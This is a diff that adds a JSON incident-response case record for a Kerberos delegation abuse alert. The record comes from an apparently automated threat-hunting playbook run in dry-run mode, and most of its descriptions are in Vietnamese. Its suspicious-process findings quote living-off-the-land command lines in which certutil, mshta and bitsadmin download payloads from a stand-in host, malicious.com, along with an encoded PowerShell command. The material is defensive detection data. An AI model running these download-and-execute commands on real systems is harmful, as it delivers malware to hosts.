@@ -1,0 +1,257 @@
+{
+  "case_id": "CASE_INC-0126",
+  "incident_id": "INC-0126",
+  "playbook_version": "1.0.0",
+  "triggered_at": "2026-09-13T15:59:34.607318",
+  "trigger": {
+    "severity": "CRITICAL",
+    "status": "OPEN",
+    "title": "LATERAL MOVEMENT THREAT: Kerberos Delegation Abuse",
+    "description": "Lateral movement pattern: Kerberos Delegation Abuse",
+    "created_at": "2026-09-13T15:58:33.663323"
+  },
+  "target": {
+    "assets": [],
+    "resolved": "Ch\u01b0a quy k\u1ebft \u0111\u01b0\u1ee3c (IOC kh\u00f4ng mang IP/hostname)"
+  },
+  "mode": "dry-run",
+  "hunt_chain": [
+    {
+      "tool": "hunt_persistence",
+      "script": "hunt_persistence_indicators.py",
+      "state_file": "hunting_persistence.json",
+      "status": "dry-run",
+      "findings": 5,
+      "by_severity": {
+        "HIGH": 3,
+        "MEDIUM": 1,
+        "CRITICAL": 1
+      },
+      "details": [
+        {
+          "type": "Registry Run Key Modification",
+          "severity": "HIGH",
+          "description": "Registry Run Key c\u00f3 th\u1ec3 b\u1ecb ch\u1ec9nh s\u1eeda \u0111\u1ec3 persistence",
+          "process": null,
+          "command_line": null,
+          "evidence": [
+            "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run",
+            "HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run"
+          ],
+          "recommendation": "Ki\u1ec3m tra registry run keys, x\u00f3a entries l\u1ea1"
+        },
+        {
+          "type": "Startup Folder Persistence",
+          "severity": "HIGH",
+          "description": "Th\u01b0 m\u1ee5c Startup c\u00f3 ch\u1ee9a files l\u1ea1",
+          "process": null,
+          "command_line": null,
+          "evidence": [
+            "C:\\Users\\*\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup",
+            "C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp"
+          ],
+          "recommendation": "Ki\u1ec3m tra Startup folders, x\u00f3a files l\u1ea1"
+        },
+        {
+          "type": "Malicious Service",
+          "severity": "HIGH",
+          "description": "Service m\u1edbi \u0111\u01b0\u1ee3c c\u00e0i \u0111\u1eb7t - ki\u1ec3m tra xem c\u00f3 ph\u1ea3i malware",
+          "process": null,
+          "command_line": null,
+          "evidence": [
+            "HKLM\\System\\CurrentControlSet\\Services\\",
+            "registry services entries"
+          ],
+          "recommendation": "Ki\u1ec3m tra services m\u1edbi, x\u00f3a n\u1ebfu l\u1ea1"
+        },
+        {
+          "type": "WMI Event Consumer Subscription",
+          "severity": "CRITICAL",
+          "description": "WMI c\u00f3 th\u1ec3 b\u1ecb d\u00f9ng cho persistence",
+          "process": null,
+          "command_line": null,
+          "evidence": [
+            "WMI Event Consumers",
+            "WMI Event Filters",
+            "Filter to Consumer Binding"
+          ],
+          "recommendation": "Ki\u1ec3m tra WMI event subscribers, x\u00f3a c\u00e1c subscriptions l\u1ea1"
+        }
+      ],
+      "data_timestamp": "2026-09-13T15:58:32.795287"
+    },
+    {
+      "tool": "hunt_suspicious_processes",
+      "script": "hunt_suspicious_processes.py",
+      "state_file": "hunting_suspicious_processes.json",
+      "status": "dry-run",
+      "findings": 6,
+      "by_severity": {
+        "HIGH": 4,
+        "MEDIUM": 2
+      },
+      "details": [
+        {
+          "type": "Suspicious Process Detection",
+          "severity": "HIGH",
+          "description": "PowerShell v\u1edbi encoded command - th\u01b0\u1eddng d\u00f9ng cho obfuscation",
+          "process": "PowerShell.exe",
+          "command_line": "powershell.exe -enc JABjAG8A...",
+          "evidence": null,
+          "recommendation": "\u0110i\u1ec1u tra process PowerShell.exe, c\u00e2n nh\u1eafc terminate n\u1ebfu x\u00e1c nh\u1eadn malicious"
+        },
+        {
+          "type": "Suspicious Process Detection",
+          "severity": "HIGH",
+          "description": "CertUtil d\u00f9ng cho t\u1ea3i file ho\u1eb7c decode",
+          "process": "certutil.exe",
+          "command_line": "certutil.exe -urlcache -f http://malicious.com/file.exe",
+          "evidence": null,
+          "recommendation": "\u0110i\u1ec1u tra process certutil.exe, c\u00e2n nh\u1eafc terminate n\u1ebfu x\u00e1c nh\u1eadn malicious"
+        },
+        {
+          "type": "Suspicious Process Detection",
+          "severity": "HIGH",
+          "description": "mshta d\u00f9ng \u0111\u1ec3 execute HTML Application",
+          "process": "mshta.exe",
+          "command_line": "mshta.exe http://malicious.com/payload.hta",
+          "evidence": null,
+          "recommendation": "\u0110i\u1ec1u tra process mshta.exe, c\u00e2n nh\u1eafc terminate n\u1ebfu x\u00e1c nh\u1eadn malicious"
+        },
+        {
+          "type": "Suspicious Process Detection",
+          "severity": "HIGH",
+          "description": "Living off the land binary - d\u00f9ng \u0111\u1ec3 bypass AV",
+          "process": "bitsadmin.exe",
+          "command_line": "bitsadmin.exe /transfer job /download /resume http://malicious.com/file.exe",
+          "evidence": null,
+          "recommendation": "\u0110i\u1ec1u tra process bitsadmin.exe, c\u00e2n nh\u1eafc terminate n\u1ebfu x\u00e1c nh\u1eadn malicious"
+        }
+      ],
+      "data_timestamp": "2026-09-13T15:58:32.982289"
+    },
+    {
+      "tool": "hunt_credential_dumping",
+      "script": "hunt_credential_dumping.py",
+      "state_file": "hunting_credential_dumping.json",
+      "status": "dry-run",
+      "findings": 5,
+      "by_severity": {
+        "CRITICAL": 4,
+        "HIGH": 1
+      },
+      "details": [
+        {
+          "type": "LSASS Memory Access",
+          "severity": "CRITICAL",
+          "description": "Ph\u00e1t hi\u1ec7n truy c\u1eadp LSASS process - d\u1ea5u hi\u1ec7u credential dumping",
+          "process": null,
+          "command_line": null,
+          "evidence": [
+            "LSASS.exe memory read access",
+            "SeDebugPrivilege abuse",
+            "Process handle duplication",
+            "Suspicious API calls (ReadProcessMemory, etc.)"
+          ],
+          "recommendation": "Ki\u1ec3m tra ngay l\u1eadp t\u1ee9c, isolate affected systems"
+        },
+        {
+          "type": "Mimikatz Activity",
+          "severity": "CRITICAL",
+          "description": "Ph\u00e1t hi\u1ec7n d\u1ea5u hi\u1ec7u ch\u1ea1y Mimikatz ho\u1eb7c t\u01b0\u01a1ng t\u1ef1",
+          "process": null,
+          "command_line": null,
+          "evidence": [
+            "sekurlsa.dll module load",
+            "wdigest registry modifications",
+            "Credential provider abuse",
+            "Golden ticket generation",
+            "Pass-the-hash activity"
+          ],
+          "recommendation": "Reset t\u1ea5t c\u1ea3 passwords, ki\u1ec3m tra kerberos tickets"
+        },
+        {
+          "type": "Kerberos Ticket Extraction",
+          "severity": "CRITICAL",
+          "description": "Ph\u00e1t hi\u1ec7n c\u1ed1 g\u1eafng dump Kerberos tickets",
+          "process": null,
+          "command_line": null,
+          "evidence": [
+            "Klist command execution",
+            "Kerberos cache manipulation",
+            "Ticket file access anomalies",
+            "KRBTGT ticket access"
+          ],
+          "recommendation": "Ki\u1ec3m tra Kerberos logs, reset KRBTGT password"
+        },
+        {
+          "type": "SAM Database Dumping",
+          "severity": "CRITICAL",
+          "description": "Ph\u00e1t hi\u1ec7n c\u1ed1 g\u1eafng dump SAM database ho\u1eb7c registry hives",
+          "process": null,
+          "command_line": null,
+          "evidence": [
+            "Registry hive export attempts",
+            "SAM/SYSTEM/SECURITY file copies",
+            "Volume Shadow Copy abuse (VSS)",
+            "Reg command (reg save) usage"
+          ],
+          "recommendation": "Ki\u1ec3m tra registry access logs, audit VSS usage"
+        },
+        {
+          "type": "Credential Transmission Over Network",
+          "severity": "HIGH",
+          "description": "Ph\u00e1t hi\u1ec7n credentials truy\u1ec1n qua m\u1ea1ng d\u01b0\u1edbi d\u1ea1ng plaintext",
+          "process": null,
+          "command_line": null,
+          "evidence": [
+            "HTTP authentication attempts",
+            "Telnet/FTP usage",
+            "Unencrypted LDAP",
+            "WinRM without encryption",
+            "Plaintext SMB auth"
+          ],
+          "recommendation": "Enforce encryption, disable plaintext protocols"
+        }
+      ],
+      "data_timestamp": "2026-09-13T15:58:33.317981"
+    },
+    {
+      "tool": "collect_timeline_events",
+      "script": "collect_timeline_events.py",
+      "state_file": "timeline.json",
+      "status": "dry-run",
+      "findings": 0,
+      "by_severity": {},
+      "details": [],
+      "data_timestamp": "2026-09-13T15:58:32.614006"
+    }
+  ],
+  "summary": {
+    "tools_run": 4,
+    "tools_succeeded": 4,
+    "total_findings": 16,
+    "by_severity": {
+      "HIGH": 8,
+      "MEDIUM": 3,
+      "CRITICAL": 5
+    }
+  },
+  "containment_plan": [
+    "1. Ng\u1eaft m\u1ea1ng",
+    "2. Qu\u00e9t Defender",
+    "3. Kh\u00f4i ph\u1ee5c"
+  ],
+  "incident_evidence": [
+    "Unconstrained delegation usage",
+    "Constrained delegation abuse",
+    "Service for User (S4U) activity",
+    "Ticket granting anomalies"
+  ],
+  "incident_recommended_action": "Ki\u1ec3m tra Kerberos delegation settings, audit ticket generation",
+  "notification": {
+    "status": "disabled",
+    "detail": "--no-telegram"
+  },
+  "notification_message": "\ud83d\udea8 T\u1ef0 \u0110\u1ed8NG \u0110I\u1ec0U TRA S\u1ef0 C\u1ed0 INC-0126\n\u2022 Thi\u1ebft b\u1ecb: Ch\u01b0a quy k\u1ebft \u0111\u01b0\u1ee3c (IOC kh\u00f4ng mang IP/hostname)\n\u2022 Ph\u00e1t hi\u1ec7n t\u1eeb Hunting: hunt_persistence: 5 ph\u00e1t hi\u1ec7n (1 CRITICAL, 3 HIGH, 1 MEDIUM) - n\u1ed5i b\u1eadt: Registry Run Key Modification; hunt_suspicious_processes: 6 ph\u00e1t hi\u1ec7n (4 HIGH, 2 MEDIUM) - n\u1ed5i b\u1eadt: Suspicious Process Detection; hunt_credential_dumping: 5 ph\u00e1t hi\u1ec7n (4 CRITICAL, 1 HIGH) - n\u1ed5i b\u1eadt: LSASS Memory Access\n\u2022 K\u1ecbch b\u1ea3n c\u00f4 l\u1eadp \u0111\u1ec1 xu\u1ea5t: 1. Ng\u1eaft m\u1ea1ng | 2. Qu\u00e9t Defender | 3. Kh\u00f4i ph\u1ee5c"
+}
